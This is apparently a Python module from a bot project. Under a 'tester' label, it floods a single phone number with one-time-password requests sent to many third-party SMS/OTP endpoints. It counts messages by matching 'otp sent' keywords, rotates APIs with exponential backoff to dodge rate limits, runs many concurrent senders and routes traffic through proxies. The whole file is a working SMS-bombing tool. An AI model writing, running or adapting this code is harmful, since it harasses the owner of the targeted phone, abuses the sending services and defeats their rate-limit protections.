from __future__ import annotations

import asyncio
import copy
import time
import random
from typing import Dict, List, Optional
from collections import deque

import aiohttp
from aiohttp import TCPConnector
from aiohttp_socks import ProxyConnector

from helpers import replacePlaceholders


# ---------------------------------------------------------------------------
# OTP success detection
# ---------------------------------------------------------------------------

OTP_KEYWORDS = [
    "otp sent", "otp has been sent", "verification code sent",
    "sent successfully", "sms sent", "message sent",
    "\"success\":true", "\"status\":\"success\"", "\"status\":\"ok\"",
    "\"result\":true", "successfully sent", "send otp",
]

def isConfirmedOtp(status: int, text: str) -> bool:
    if status not in (200, 201, 202):
        return False
    t = text.lower()
    return any(k in t for k in OTP_KEYWORDS)

def is2xx(status: int) -> bool:
    return 200 <= status < 300


# ---------------------------------------------------------------------------
# Per-API state
# ---------------------------------------------------------------------------

class ApiState:
    ACTIVE      = "active"
    RATELIMITED = "ratelimited"
    DEAD        = "dead"

    # Exponential backoff bounds (seconds)
    RL_BASE     = 30.0
    RL_MAX      = 300.0
    DEAD_STREAK = 5       # errors in a row before marking dead

    def __init__(self, name: str):
        self.name           = name
        self.status         = self.ACTIVE
        self.cooldownUntil  = 0.0
        self.errorStreak    = 0
        self.rlCount        = 0       # how many times rate-limited this session
        self.requests       = 0
        self.confirmed      = 0
        self.responses2xx   = 0
        self.rateLimits     = 0
        self.errors         = 0
        self.totalLatencyMs = 0.0
        self.latencyCount   = 0
        self._inFlight      = 0       # concurrent requests to this API right now

    def isAvailable(self) -> bool:
        if self.status == self.DEAD:
            return False
        if self.status == self.RATELIMITED:
            if time.time() >= self.cooldownUntil:
                self.status = self.ACTIVE
                return True
            return False
        return True

    def cooldownDuration(self) -> float:
        """Exponential backoff: 30s, 60s, 120s, 240s, capped at 300s."""
        return min(self.RL_BASE * (2 ** self.rlCount), self.RL_MAX)

    def recordLatency(self, latencySeconds: float) -> None:
        self.totalLatencyMs += latencySeconds * 1000
        self.latencyCount   += 1

    def avgMs(self) -> int:
        if self.latencyCount == 0:
            return 0
        return int(self.totalLatencyMs / self.latencyCount)


# ---------------------------------------------------------------------------
# Stats
# ---------------------------------------------------------------------------

class Stats:
    def __init__(self, apiNames: List[str]) -> None:
        self.startTime  = time.time()
        self.totalReqs  = 0
        self.confirmed  = 0
        self.responses  = 0
        self.errors     = 0
        self.apiStates: Dict[str, ApiState] = {n: ApiState(n) for n in apiNames}
        self._lock = asyncio.Lock()

    def elapsed(self) -> float:
        return time.time() - self.startTime

    def rps(self) -> float:
        e = self.elapsed()
        return round(self.totalReqs / e, 1) if e > 0 else 0.0

    async def recordSuccess(self, name: str, latency: float, confirmed: bool) -> None:
        async with self._lock:
            self.totalReqs += 1
            self.responses += 1
            s = self.apiStates[name]
            s.requests     += 1
            s.responses2xx += 1
            s.errorStreak   = 0
            s._inFlight     = max(0, s._inFlight - 1)
            s.recordLatency(latency)
            if confirmed:
                s.confirmed  += 1
                self.confirmed += 1

    async def recordRateLimit(self, name: str) -> None:
        async with self._lock:
            self.totalReqs += 1
            s = self.apiStates[name]
            s.requests    += 1
            s.rateLimits  += 1
            s.rlCount     += 1
            s._inFlight    = max(0, s._inFlight - 1)

    async def recordError(self, name: str) -> None:
        async with self._lock:
            self.totalReqs += 1
            self.errors    += 1
            s = self.apiStates[name]
            s.requests    += 1
            s.errors      += 1
            s.errorStreak += 1
            s._inFlight    = max(0, s._inFlight - 1)
            if s.errorStreak >= ApiState.DEAD_STREAK:
                s.status = ApiState.DEAD

    async def trackInFlight(self, name: str, delta: int) -> None:
        async with self._lock:
            s = self.apiStates[name]
            s._inFlight = max(0, s._inFlight + delta)

    def snapshot(self) -> dict:
        perApi = {}
        for name, s in self.apiStates.items():
            perApi[name] = {
                "requests":   s.requests,
                "confirmed":  s.confirmed,
                "responses":  s.responses2xx,
                "errors":     s.errors,
                "ratelimits": s.rateLimits,
                "avgMs":      s.avgMs(),
                "status":     s.status,
            }
        return {
            "totalReqs": self.totalReqs,
            "confirmed": self.confirmed,
            "responses": self.responses,
            "errors":    self.errors,
            "elapsed":   round(self.elapsed(), 1),
            "rps":       self.rps(),
            "perApi":    perApi,
            "total":     self.totalReqs,
            "otpSent":   self.confirmed,
        }


# ---------------------------------------------------------------------------
# Round-robin API queue with exponential backoff
# ---------------------------------------------------------------------------

class ApiQueue:
    MAX_INFLIGHT_PER_API = 8   # max concurrent hits to a single API

    def __init__(self, configs: List[dict], skipSet: set, stats: Stats) -> None:
        self._all    = [c for c in configs if c["name"] not in skipSet]
        self._queue  = deque(self._all)
        self._dead:  set = set()
        self._lock   = asyncio.Lock()
        self._stats  = stats

    async def next(self) -> Optional[dict]:
        async with self._lock:
            now     = time.time()
            checked = 0
            total   = len(self._queue)

            while checked < total:
                if not self._queue:
                    return None
                api  = self._queue.popleft()
                name = api["name"]

                if name in self._dead:
                    checked += 1
                    continue

                state = self._stats.apiStates.get(name)
                if state is None:
                    self._queue.append(api)
                    return api

                # Skip if cooling down
                if state.status == ApiState.RATELIMITED:
                    if time.time() < state.cooldownUntil:
                        self._queue.append(api)
                        checked += 1
                        continue
                    else:
                        state.status = ApiState.ACTIVE

                # Skip if dead
                if state.status == ApiState.DEAD:
                    self._dead.add(name)
                    checked += 1
                    continue

                # Per-API concurrency cap
                if state._inFlight >= self.MAX_INFLIGHT_PER_API:
                    self._queue.append(api)
                    checked += 1
                    continue

                # Good to go
                state._inFlight += 1
                self._queue.append(api)
                return api

            return None

    async def markRateLimited(self, name: str) -> None:
        async with self._lock:
            state = self._stats.apiStates.get(name)
            if state:
                cooldown = state.cooldownDuration()
                state.cooldownUntil = time.time() + cooldown
                state.status        = ApiState.RATELIMITED

    async def markDead(self, name: str) -> None:
        async with self._lock:
            self._dead.add(name)
            state = self._stats.apiStates.get(name)
            if state:
                state.status = ApiState.DEAD

    def activeCount(self) -> int:
        now  = time.time()
        dead = len(self._dead)
        cooling = sum(
            1 for s in self._stats.apiStates.values()
            if s.status == ApiState.RATELIMITED and s.cooldownUntil > now
        )
        return max(0, len(self._all) - dead - cooling)


# ---------------------------------------------------------------------------
# Type coercion after placeholder replacement
# ---------------------------------------------------------------------------

def coerceTypes(obj, original):
    if isinstance(original, dict) and isinstance(obj, dict):
        return {k: coerceTypes(obj.get(k, v), v) for k, v in original.items()}
    if isinstance(original, list) and isinstance(obj, list):
        return [coerceTypes(o, p) for o, p in zip(obj, original)]
    if isinstance(original, int) and isinstance(obj, str):
        try: return int(obj)
        except (ValueError, TypeError): return obj
    if isinstance(original, float) and isinstance(obj, str):
        try: return float(obj)
        except (ValueError, TypeError): return obj
    return obj


# ---------------------------------------------------------------------------
# Core API caller
# ---------------------------------------------------------------------------

async def callApi(
    session: aiohttp.ClientSession,
    api: dict,
    phone: str,
    stats: Stats,
    apiQueue: ApiQueue,
    stopEvent: asyncio.Event,
) -> None:
    name = api["name"]
    if stopEvent.is_set():
        # Decrement in-flight since we incremented in ApiQueue.next()
        await stats.trackInFlight(name, -1)
        return

    try:
        cfg      = copy.deepcopy(api)
        headers  = replacePlaceholders(cfg.get("headers"), phone)
        params   = replacePlaceholders(cfg.get("params"), phone)
        jsonData = coerceTypes(replacePlaceholders(cfg.get("json"), phone), api.get("json"))
        data     = replacePlaceholders(cfg.get("data"), phone)
        cookies  = replacePlaceholders(cfg.get("cookies"), phone)
        url      = cfg["url"].replace("{phone}", phone)

        t0 = time.time()
        async with session.request(
            cfg["method"], url,
            headers=headers, params=params,
            json=jsonData, data=data, cookies=cookies,
            timeout=aiohttp.ClientTimeout(total=8, connect=3),
            allow_redirects=True,
            ssl=False,
        ) as resp:
            latency = time.time() - t0
            text    = await resp.text()

            if resp.status == 429:
                await apiQueue.markRateLimited(name)
                await stats.recordRateLimit(name)
                return

            if is2xx(resp.status):
                confirmed = isConfirmedOtp(resp.status, text)
                await stats.recordSuccess(name, latency, confirmed)
                return

            # 4xx/5xx
            await stats.recordError(name)
            state = stats.apiStates.get(name)
            if state and state.errorStreak >= ApiState.DEAD_STREAK:
                await apiQueue.markDead(name)

    except asyncio.TimeoutError:
        await stats.recordError(name)
        state = stats.apiStates.get(name)
        if state and state.errorStreak >= ApiState.DEAD_STREAK:
            await apiQueue.markDead(name)
    except (aiohttp.ClientConnectorError, aiohttp.ServerDisconnectedError):
        await stats.recordError(name)
        state = stats.apiStates.get(name)
        if state and state.errorStreak >= ApiState.DEAD_STREAK:
            await apiQueue.markDead(name)
    except Exception:
        await stats.recordError(name)


# ---------------------------------------------------------------------------
# Single API test (admin tester)
# ---------------------------------------------------------------------------

async def testSingleApi(api: dict, phone: str) -> dict:
    try:
        cfg      = copy.deepcopy(api)
        headers  = replacePlaceholders(cfg.get("headers"), phone)
        params   = replacePlaceholders(cfg.get("params"), phone)
        jsonData = coerceTypes(replacePlaceholders(cfg.get("json"), phone), api.get("json"))
        data     = replacePlaceholders(cfg.get("data"), phone)
        cookies  = replacePlaceholders(cfg.get("cookies"), phone)
        url      = cfg["url"].replace("{phone}", phone)

        connector = TCPConnector(limit=10, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            t0 = time.time()
            async with session.request(
                cfg["method"], url,
                headers=headers, params=params,
                json=jsonData, data=data, cookies=cookies,
                timeout=aiohttp.ClientTimeout(total=15),
                allow_redirects=True,
            ) as resp:
                latency = round((time.time() - t0) * 1000)
                text    = await resp.text()
                return {
                    "ok":        True,
                    "status":    resp.status,
                    "latencyMs": latency,
                    "snippet":   text[:300].strip(),
                }
    except asyncio.TimeoutError:
        return {"ok": False, "error": "Timeout (>15s)"}
    except aiohttp.ClientConnectorError as e:
        return {"ok": False, "error": f"Connection failed: {str(e)[:60]}"}
    except aiohttp.ClientSSLError as e:
        return {"ok": False, "error": f"SSL error: {str(e)[:60]}"}
    except Exception as e:
        return {"ok": False, "error": (str(e).strip() or type(e).__name__)[:80]}


# ---------------------------------------------------------------------------
# Proxy helpers
# ---------------------------------------------------------------------------

async def checkProxy(proxy: str) -> Optional[str]:
    try:
        connector = ProxyConnector.from_url(proxy)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(
                "http://httpbin.org/ip",
                timeout=aiohttp.ClientTimeout(total=5)
            ):
                return proxy
    except Exception:
        return None


async def validateProxies(proxyList: List[str]) -> List[str]:
    results = await asyncio.gather(*[checkProxy(p) for p in proxyList])
    return [p for p in results if p]


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

class TesterRunner:
    def __init__(
        self,
        phone: str,
        duration: int,
        workers: int,
        useProxy: bool,
        proxyList: Optional[List[str]] = None,
    ) -> None:
        self.phone      = phone
        self.duration   = duration
        self.workers    = workers
        self.useProxy   = useProxy
        self._proxyList = proxyList or []

        from bot.services.api_manager import apiManager
        from bot.services.database import db
        self._apiConfigs = apiManager.getMergedConfigs()
        self._skipSet    = db.getSkippedApiNames()

        self.stats      = Stats([a["name"] for a in self._apiConfigs])
        self._stopEvent = asyncio.Event()
        self._tasks: List[asyncio.Task] = []
        self._running   = False
        self._endTime   = 0.0

    @property
    def isRunning(self) -> bool:
        return self._running

    async def start(self) -> None:
        self._running  = True
        self._endTime  = time.time() + self.duration
        self._stopEvent.clear()
        self.stats     = Stats([a["name"] for a in self._apiConfigs])
        self._apiQueue = ApiQueue(self._apiConfigs, self._skipSet, self.stats)

        proxyList: List[str] = []
        if self.useProxy and self._proxyList:
            proxyList = await validateProxies(self._proxyList)

        for i in range(self.workers):
            proxy = proxyList[i % len(proxyList)] if proxyList else None
            task  = asyncio.create_task(
                self._sender(proxy),
                name=f"sender_{i}",
            )
            self._tasks.append(task)

        timer    = asyncio.create_task(self._timer(),    name="timer")
        watchdog = asyncio.create_task(self._watchdog(), name="watchdog")
        self._tasks.extend([timer, watchdog])

    async def stop(self) -> None:
        self._stopEvent.set()
        for t in self._tasks:
            t.cancel()
        await asyncio.gather(*self._tasks, return_exceptions=True)
        self._tasks.clear()
        self._running = False

    async def _timer(self) -> None:
        delay = self._endTime - time.time()
        if delay > 0:
            await asyncio.sleep(delay)
        self._stopEvent.set()

    async def _watchdog(self) -> None:
        senderTasks = [t for t in self._tasks if t.get_name().startswith("sender_")]
        if senderTasks:
            await asyncio.gather(*senderTasks, return_exceptions=True)
        self._running = False

    async def _sender(self, proxy: Optional[str]) -> None:
        connector = ProxyConnector.from_url(proxy) if proxy else TCPConnector(
            limit=300,
            limit_per_host=20,
            ttl_dns_cache=300,
            ssl=False,
        )
        async with aiohttp.ClientSession(
            connector=connector,
            connector_owner=True,
        ) as session:
            activeTasks: set = set()

            while not self._stopEvent.is_set():
                # Clean up done tasks
                activeTasks = {t for t in activeTasks if not t.done()}

                # Throttle: max 50 concurrent per worker
                if len(activeTasks) >= 50:
                    await asyncio.sleep(0.02)
                    continue

                api = await self._apiQueue.next()
                if api is None:
                    # All APIs cooling/dead — short sleep then retry
                    await asyncio.sleep(0.5)
                    continue

                task = asyncio.create_task(
                    callApi(session, api, self.phone, self.stats, self._apiQueue, self._stopEvent)
                )
                activeTasks.add(task)
                # Tiny yield to allow event loop to breathe
                await asyncio.sleep(0)

            # Stop fired — cancel all in-flight immediately
            for t in activeTasks:
                t.cancel()
            if activeTasks:
                await asyncio.gather(*activeTasks, return_exceptions=True)